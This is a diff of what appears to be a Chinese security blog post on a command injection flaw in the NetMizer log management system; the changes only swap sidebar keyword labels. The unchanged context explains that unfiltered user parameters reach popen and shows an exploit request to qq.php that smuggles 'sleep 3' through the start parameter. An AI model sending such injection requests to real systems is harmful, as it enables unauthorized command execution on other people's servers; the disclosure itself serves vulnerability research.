@@ -76,11 +76,11 @@ NetMizer日志管理系统是一款专为网络流量管理和优化设计的日
 
 深入探索
 
-编程
+企业资源计划
 
-网络
+Web安全咨询
 
-软件
+计算机服务器
 
 用户可控参数直接拼接进系统命令字符串 `$cmd` 中，并通过 `popen($cmd, "r")` 执行。参数如 `$nodeid`、`$srcid`、`$user`、`$qq` 和 `$start` 来自用户输入，未经过任何过滤或转义。这些参数在命令构建过程中直接插入，造成[命令注入](https://mrxn.net/tag/rce)[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")。
 
@@ -88,7 +88,7 @@ NetMizer日志管理系统是一款专为网络流量管理和优化设计的日
 
 [漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用示例
 
-软件
+漏洞扫描服务
 
 ```
 GET /data/search/qq.php?action=file&start=1;sleep+3+%23+ HTTP/1.1
